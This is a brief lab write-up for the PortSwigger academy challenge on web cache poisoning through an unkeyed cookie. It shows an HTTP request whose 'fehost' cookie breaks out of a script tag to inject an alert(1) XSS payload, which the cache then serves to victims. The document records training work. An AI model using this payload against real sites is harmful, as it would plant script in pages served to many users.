# [Web cache poisoning with an unkeyed cookie] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-27
 
---
 
## Vulnerability / core concept
Web Cache Poisoning

---


## Payload / key command
When we send request to `/`, we notice that cookie value is displayed in `script` in the response. That basically screams web cache poisoning.

```bash
GET / HTTP/2
Host: 0a8b00ad04252b5c80602620005f00b3.web-security-academy.net
Cookie: session=iGWX5VahGIm1SdgXdUNNadq4wxZyg7cs; fehost=prod-cache-01"}</script><script>alert(1)</script>"
...
```
This request contains a malicious cookie value that escapes `script` in the response and executes in victims' browser, who get response from cache.


